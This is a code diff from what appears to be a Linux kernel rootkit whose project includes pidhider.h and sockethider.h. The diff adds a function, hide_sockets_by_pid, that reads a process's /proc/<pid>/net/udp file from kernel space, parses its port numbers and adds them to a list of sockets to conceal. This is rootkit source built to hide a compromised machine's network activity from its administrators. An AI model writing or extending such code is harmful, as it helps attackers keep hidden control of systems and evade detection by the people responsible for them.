@@ -2,6 +2,10 @@
 #include "pidhider.h"
 #include "sockethider.h"
 
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+#include <linux/fs.h>
 #include <linux/kallsyms.h>
 #include <linux/net.h>
 #include <linux/slab.h>
@@ -383,4 +387,60 @@ void clear_socket_list(void)
         list_del(pos);
         kfree(tmp);
     }
+}
+
+void hide_sockets_by_pid(unsigned short pid) {
+    mm_segment_t oldfs;
+    struct file *filp;
+    char line[TMPSZ_UDP4];
+    loff_t pos = 0;
+    ssize_t s;
+
+    /* ex: /proc/65536/net/tcp6 */
+    char fname[22];
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    snprintf(fname, 22, "/proc/%d/net/udp", pid);
+    filp = filp_open(fname, O_RDONLY, 0);
+    if (filp == NULL) {
+        LOG_ERROR("could not open /proc/%d/net/udp", pid);
+        return;
+    }
+
+    // skip first line
+    vfs_read(filp, line, TMPSZ_UDP4, &pos);
+
+    while ((s = vfs_read(filp, line, TMPSZ_UDP4, &pos)) == TMPSZ_UDP4) {
+        char port_str[5];
+        int port;
+        char *ptr;
+
+        LOG_INFO("reading /proc/%d/net/udp file line", pid);
+
+        // find port
+        ptr = strnstr(line, ":", TMPSZ_UDP4);
+        ptr++;
+        ptr = strnstr(ptr, ":", TMPSZ_UDP4);
+        ptr++;
+
+        // copy port
+        memcpy(port_str, ptr, 4);
+        port_str[4] = 0;
+
+        LOG_INFO("port found %s", port_str);
+
+        // hex to int
+        kstrtoint(port_str, 16, &port);
+
+        // add to list
+        add_to_socket_list(port, udp4);
+    }
+
+    LOG_INFO("DEBUG: s = %d", s);
+
+    filp_close(filp, NULL);
+
+    set_fs(oldfs);
 }
